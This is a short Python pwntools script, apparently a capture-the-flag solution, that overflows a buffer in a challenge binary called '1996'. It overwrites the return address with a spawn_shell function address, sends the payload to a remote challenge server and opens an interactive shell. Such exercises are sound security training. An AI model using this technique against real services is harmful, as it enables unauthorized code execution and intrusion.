from pwn import *

# Set up the binary
# elf = context.binary = ELF("./1996")
#
# # Find shell function address
# print(elf.symbols)
shell_addr = 0x0000000000400897 #elf.symbols["spawn_shell"]

# Generate payload (offset may vary)
offset = 1048  # Adjust based on analysis
payload = b"A" * offset + p64(shell_addr)

# Write payload to file or send to process
# with open("payload.txt", "wb") as f:
#     f.write(payload)
#
# # Run in GDB for debugging
# io = gdb.debug(["./1996"], gdbscript="continue")
# io.sendline(payload)
r = remote("1996.challs.cyberchallenge.it", 9121)
r.sendline(payload)
r.interactive()
